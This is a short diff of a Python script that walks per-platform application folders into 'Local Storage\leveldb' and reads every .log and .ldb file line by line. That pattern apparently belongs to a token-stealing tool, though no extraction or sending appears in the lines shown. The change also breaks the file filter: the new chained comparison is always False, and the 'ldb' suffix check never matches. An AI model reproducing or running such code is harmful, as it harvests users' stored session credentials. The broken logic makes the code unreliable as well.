@@ -44,13 +44,13 @@ for platform, path in PATHS.items():
     if os.path.exists(path) is False:
         continue
 
-    path += '\\Local Storage\\leveldb'
+    path = os.path.join(path, 'Local Storage', 'leveldb')
 
-    for file_name in os.listdir(path):
-        if not file_name[-4:] in ('.log', 'ldb'):
+    for item in os.listdir(path):
+        if item[-4:] in ('.log', 'ldb') is False:
             continue
 
-        with open(f'{path}\\{file_name}', errors='ignore', encoding='utf-8') as file:
+        with open(os.path.join(path, item), errors='ignore', encoding='utf-8') as file:
             lines = file.readlines()
 
         for line in lines:
